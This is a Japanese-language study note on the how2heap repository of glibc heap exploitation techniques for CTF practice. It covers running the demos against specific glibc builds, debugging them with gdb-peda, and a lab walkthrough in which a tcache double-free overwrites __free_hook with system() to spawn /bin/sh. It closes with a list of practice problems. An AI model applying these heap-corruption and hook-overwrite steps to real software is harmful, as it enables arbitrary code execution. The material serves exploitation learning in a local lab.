# how2heap

## 概要
```
shellphishという有名チームが作成/メンテしているheap exploitation techniquesの学習用リポジトリ。

シンプルなプログラムで理解しやすく、学習目的で有効。

学習後も攻略の流れを忘れたとき、exploitが思い通り動かなかったときなどで時々参照している

https://github.com/shellphish/how2heap
```

## 読み進め方

```
Pwn学習用dockerコンテナの次のパスに配置してビルド済み
/opt/ctf/tools/how2heap

□ファイル構成　
★印は要確認　☆印はglibc_2.25/glibc_2.26のいずれか一つを確認でよい

# find /opt/ctf/tools/how2heap -type f | grep '.c$'
/opt/ctf/tools/how2heap/fastbin_dup.c                        ★
/opt/ctf/tools/how2heap/first_fit.c

/opt/ctf/tools/how2heap/glibc_2.25/fastbin_dup_consolidate.c ★
/opt/ctf/tools/how2heap/glibc_2.25/fastbin_dup_into_stack.c  ★
/opt/ctf/tools/how2heap/glibc_2.25/house_of_einherjar.c      ★
/opt/ctf/tools/how2heap/glibc_2.25/house_of_force.c          ★
/opt/ctf/tools/how2heap/glibc_2.25/house_of_lore.c           ★
/opt/ctf/tools/how2heap/glibc_2.25/house_of_orange.c         ★
/opt/ctf/tools/how2heap/glibc_2.25/house_of_spirit.c         ★
/opt/ctf/tools/how2heap/glibc_2.25/large_bin_attack.c        ★
/opt/ctf/tools/how2heap/glibc_2.25/overlapping_chunks.c      ★
/opt/ctf/tools/how2heap/glibc_2.25/overlapping_chunks_2.c    ★
/opt/ctf/tools/how2heap/glibc_2.25/poison_null_byte.c        ★
/opt/ctf/tools/how2heap/glibc_2.25/unsafe_unlink.c           ★
/opt/ctf/tools/how2heap/glibc_2.25/unsorted_bin_attack.c     ★
/opt/ctf/tools/how2heap/glibc_2.25/unsorted_bin_into_stack.c ★

/opt/ctf/tools/how2heap/glibc_2.26/house_of_botcake.c        ★ 最近追加(tcacheがらみ)
/opt/ctf/tools/how2heap/glibc_2.26/house_of_einherjar.c      ☆ t-cacheオプション無効で確認
/opt/ctf/tools/how2heap/glibc_2.26/house_of_lore.c           ☆ 同上
/opt/ctf/tools/how2heap/glibc_2.26/large_bin_attack.c        ☆ 同上
/opt/ctf/tools/how2heap/glibc_2.26/overlapping_chunks.c      ☆ 同上
/opt/ctf/tools/how2heap/glibc_2.26/tcache_dup.c              ★
/opt/ctf/tools/how2heap/glibc_2.26/tcache_house_of_spirit.c  ★
/opt/ctf/tools/how2heap/glibc_2.26/tcache_poisoning.c        ★
/opt/ctf/tools/how2heap/glibc_2.26/unsafe_unlink.c           ☆ t-cacheオプション無効で確認
/opt/ctf/tools/how2heap/glibc_2.26/unsorted_bin_attack.c     ☆ 同上
/opt/ctf/tools/how2heap/glibc_2.26/unsorted_bin_into_stack.c ☆ 同上
/opt/ctf/tools/how2heap/malloc_playground.c

どれもCTF世界大会でよく出題されている

★印のファイルを確認して攻略の流れ、chunkをオーバーラップさせる方法、fake chunkの作り方、メモリ配置などをつかんでおきたい


  Q. 読み進める際のお奨めの順番は？
  A. どこから読み進めても問題ないが、 chunkのオーバーラップ系(fastbin_*,overlapping_*,poison_*)から読み進めて、
      house_of_*/*_attack/unsafe_unlinkなどに進んでいくとよいかも。ソースコードを見てボリュームがありそうな
      house_of_orange.cなどは後回しにして、少し慣れてきてから読んでみるのがお奨め


細かい説明は後回しにしたが、Pwn学習用コンテナの以下のパスのファイルに、それぞれの手法の概要、適用条件、gdbでの確認方法、過去事例などを記載している

  + how2heap解析時のメモ書き
    /opt/ctf/tools/ctf-tools/pwn/perl_pwntools/template/how2heap_memo.txt
  + tcache関連のファイルが追加されたタイミングで確認した際のメモ書き
    /opt/ctf/tools/ctf-tools/pwn/perl_pwntools/template/how2heap_201902_memo.md

慣れてきたら、次のページに掲載されている過去問も解いて実践で使えるようになっておきたい
https://github.com/shellphish/how2heap
```

## 動作検証
```

ソースコードに目を通した後、次のような方法で確認していくとよい

起動

  e.g.
  bash glibc_run.sh 2.26 glibc_2.26/large_bin_attack
  bash glibc_run.sh 2.26 glibc_2.26/tcache_poisoning

  やっていることはシンプル
  # bash -x glibc_run.sh 2.26 glibc_2.26/tcache_poisoning
  + VERSION=./glibc_versions
  + [[ 2 < 2 ]]
  + '[' '!' -e ./glibc_versions/libc-2.26.so ']'
  + LD_PRELOAD=./glibc_versions/libc-2.26.so   
  + ./glibc_versions/ld-2.26.so glibc_2.26/tcache_poisoning
  ★環境変数（LD_PRELOAD=./glibc_versions/libc-2.26.so）を指定して./glibc_versions/ld-2.26.so glibc_2.26/tcache_poisoningを実行しているだけ

socatで起動したい場合

  e.g.
  # vi tp.sh
  # cat tp.sh
  #!/bin/sh
  LD_PRELOAD=glibc_versions/libc-2.26.so ./glibc_versions/ld-2.26.so ./glibc_2.26/tcache_dup
  # chmod 755 tp.sh
  # socat TCP-LISTEN:5000,reuseaddr,fork EXEC:./tp.sh
  
  別端末で接続する
  # nc localhost 5000

gdbで解析したい場合

  参考
  なぜかgdbで環境変数やパスを通してもNG
  gdb-peda$ set environment LD_PRELOAD glibc_versions/libc-2.26.so
  gdb-peda$ start
  Stopped reason: SIGSEGV
  =>NG

  # gdb -q ./glibc_versions/ld-2.26.so
  Reading symbols from ./glibc_versions/ld-2.26.so...done.
  gdb-peda$ set solib-absolute-prefix /opt/ctf/tools/how2heap/glibc_versions/
  gdb-peda$ set solib-search-path /opt/ctf/tools/how2heap/glibc_versions/
  gdb-peda$ r /opt/ctf/tools/how2heap/glibc_2.26/tcache_dup
  =>NG

  # gdb -q ./glibc_versions/ld-2.26.so
  gdb-peda$ set exec-wrapper env 'LD_PRELOAD=glibc_versions/libc-2.26.so'
  gdb-peda$ r /opt/ctf/tools/how2heap/glibc_2.26/tcache_dup
  Starting program: /opt/ctf/tools/how2heap/glibc_versions/ld-2.26.so /opt/ctf/tools/how2heap/glibc_2.26/tcache_dup
  This file demonstrates a simple double-free attack with tcache.
  Allocating buffer.
  malloc(8): 0x7ffff7fff260
  Freeing twice...
  Now the free list has [ 0x7ffff7fff260, 0x7ffff7fff260 ].
  Next allocated buffers will be same: [ 0x7ffff7fff260, 0x7ffff7fff260 ].
  [Inferior 1 (process 21095) exited normally]
  =>OK

  main関数で止めたい

  # gdb -q ./glibc_versions/ld-2.26.so
  gdb-peda$ set exec-wrapper env 'LD_PRELOAD=glibc_versions/libc-2.26.so'
  gdb-peda$ start glibc_2.26/tcache_dup
  gdb-peda$ b *(_dl_start_user+60)
  gdb-peda$ c
  gdb-peda$ symbol-file glibc_2.26/tcache_dup
  gdb-peda$ b main
  gdb-peda$ c
  [-------------------------------------code-------------------------------------]
     0x400657 <main+1>:   mov    rbp,rsp
     0x40065a <main+4>:   push   rbx
     0x40065b <main+5>:   sub    rsp,0x18
  => 0x40065f <main+9>:   mov    rax,QWORD PTR [rip+0x2009fa]        # 0x601060 <stderr@@GLIBC_2.2.5>
     0x400666 <main+16>:  mov    rcx,rax
     0x400669 <main+19>:  mov    edx,0x40
     0x40066e <main+24>:  mov    esi,0x1
     0x400673 <main+29>:  mov    edi,0x4007e8
  =>OK

  これでもよいが、少し面倒。絶対忘れる
  解析したいところで処理を止めて、別端末からgdbでアタッチした方が早い

  例えばプログラムtcache_dup.cの先頭付近にgetchar();を入れて、makeを実行し、gdbでアタッチする
  ＃他によい方法がありましたら教えてください
 
  # gdb -q -p `pidof -s glibc_versions/ld-2.26.so ` -ex 'symbol-file glibc_2.26/tcache_dup'
  gdb-peda$ vmmap
  Start              End                Perm      Name
  0x00400000         0x00401000         r-xp      /home/guru/work/ctf/how2heap/glibc_2.26/tcache_dup
  0x00600000         0x00601000         r--p      /home/guru/work/ctf/how2heap/glibc_2.26/tcache_dup
  0x00601000         0x00602000         rw-p      /home/guru/work/ctf/how2heap/glibc_2.26/tcache_dup
  0x00007ffff7a27000 0x00007ffff7bcf000 r-xp      /home/guru/work/ctf/how2heap/glibc_versions/libc-2.26.so
  0x00007ffff7bcf000 0x00007ffff7dce000 ---p      /home/guru/work/ctf/how2heap/glibc_versions/libc-2.26.so
  0x00007ffff7dce000 0x00007ffff7dd2000 r--p      /home/guru/work/ctf/how2heap/glibc_versions/libc-2.26.so
  0x00007ffff7dd2000 0x00007ffff7dd4000 rw-p      /home/guru/work/ctf/how2heap/glibc_versions/libc-2.26.so
  0x00007ffff7dd4000 0x00007ffff7dd8000 rw-p      mapped
  0x00007ffff7dd8000 0x00007ffff7dfd000 r-xp      /home/guru/work/ctf/how2heap/glibc_versions/ld-2.26.so
  0x00007ffff7ff5000 0x00007ffff7ff7000 rw-p      mapped
  0x00007ffff7ff7000 0x00007ffff7ffa000 r--p      [vvar]
  0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]
  0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /home/guru/work/ctf/how2heap/glibc_versions/ld-2.26.so
  0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /home/guru/work/ctf/how2heap/glibc_versions/ld-2.26.so
  0x00007ffff7ffe000 0x00007ffff8020000 rw-p      [heap]
  0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]
  0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
  =>★ビルドした共有ライブラリをリンクした状態で起動している点がポイント

  あとはステップ実行するなどして、メモリの確保前後、開放前後で処理を止めて、メモリ配置を確認していけばよい

  e.g.
  b malloc
  b free
  c
  (別端末でEnter)
  heapinfo
  fin
  telescope $1-0x10
  searchmem $1-0x10
  c
  fin
  heapinfo
  (0x20)   tcache_entry[0](1): 0x7fceecd21270
  c
  fin
  (0x20)   tcache_entry[0](2): 0x7fceecd21270 --> 0x7fceecd21270 (overlap chunk with 0x7fceecd21260(freed) )
  ★overlap chunk成功
  ...


重要な点は次の２つ

  + 動作検証を通して、chunkのオーバーラップで使える方法を理解すること
     chunk のオーバーラップが可能=>任意アドレスを確保可能=>任意アドレスを上書き可能
     応用: house of spiritやunsafe unlinkなどでもchunkのオーバーラップは可能
  + 動作検証を通して、House of *や任意アドレスの更新につなげることができるfake chunkの作成方法やメモリ配置の工夫について理解すること


<デモ実施>
例:
$ cat glibc_2.26/tcache_dup.c
#include <stdio.h>
#include <stdlib.h>

int main()
{
        getchar();
        fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n");

        fprintf(stderr, "Allocating buffer.\n");
        int *a = malloc(8);

        fprintf(stderr, "malloc(8): %p\n", a);
        fprintf(stderr, "Freeing twice...\n");
        free(a);
        free(a);

        fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
        fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));

        int *b = malloc(8);
        int *c = malloc(8);
        *c = system;
        free(b);

        return 0;
}

chunkをオーバーラップした状態で、malloc(3)してfd部分に__free_hookのアドレスを格納

Now the free list has [ 0x7f35e430c270, 0x7f35e430c270 ].

gdb-peda$ set follow-fork-mode child
gdb-peda$ p &__free_hook
$3 = (void (**)(void *, const void *)) 0x7f35e3cbfb18 <__free_hook>
gdb-peda$ set {void *}0x7f35e430c270=0x7f35e3cbfb18
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x7f35e430c280 (size : 0x1fd80)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x20)   tcache_entry[0](1): 0x7f35e430c270 --> 0x7f35e3cbfb18★2回mallocすると...
戻り値が__free_hookのアドレスになる
RAX: 0x7f35e3cbfb18 --> 0x0

確保したアドレス__free_hookにsystem関数のアドレスを格納
gdb-peda$ p system
$8 = {<text variable, no debug info>} 0x7f34d8e49f20 <__libc_system>
gdb-peda$ set {void *}0x7f35e3cbfb18=0x7f34d8e49f20

freeするアドレスに"/bin/sh"を格納
gdb-peda$ searchmem /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7f4684148686 --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ set {void *}0x7f34d9e7d290=0x68732f6e69622f 

free(0x7f34d9e7d290)実行
でシェルが起動する
gdb-peda$ c
Continuing.
[New process 21501]
process 21501 is executing new program: /bin/dash★


```

## 学習目的で使えそうなお奨めの過去問(shellphishのページに載っていないもの)
```

fastbin attack
InCTF 2017 - warm_heap 100 bof、fastbins unlink attack、難度中
[shellphish] Hitcon 2016 SleepyHolder, 9447-search-engine, 0ctf 2017-babyheap
house of einherjar
Hack.lu CTF 2017 - exam 200 bof、house of einherjar 難度中
[shellphish] Seccon 2016-tinypad
house of force
BackdoorCTF 2018 - BOOKKEEPING 350 難度中
[shellphish] Boston Key Party 2016-cookbook, BCTF 2016-bcloud
house of lore
SECCON 2017 - Online candy store 400 難度中
house of orange
Timisoara CTF 2018 - Heap school 102 300 難度中　★House of Orangeとunsortbin attackの学習にちょうどよい問題！
[shellphish] Hitcon 2016 houseoforange
house of spirit
HarekazeCTF 2018 - Flea Attack 200 : House of Spirit/double freeでchunkをオーバーラップした後、fastbin attackで攻略 難度中
[shellphish] hack.lu CTF 2014-OREO
poison null byte
TUCTF 2017 - Temple 500 off-by-one、poison x byte 難度中
[shellphish] PlaidCTF 2015-plaiddb
unsafe unlink
InCTF 2017 - Gryffindor 200 bof、unlink attack、難度中
[shellphish] HITCON CTF 2014-stkof, Insomni'hack 2017-Wheel of Robots
unsorted bin attack
Timisoara CTF 2018 - Heap school 102 300 難度中　★House of Orangeとunsortbin attackの学習にちょうどよい問題！
[shellphish] 0ctf 2016-zerostorage
tcache絡み
HSCTF 6 - Aria Writer 500 難度中
PlaidCTF 2019-SPlaid Birch (tcache-poisoning)
```
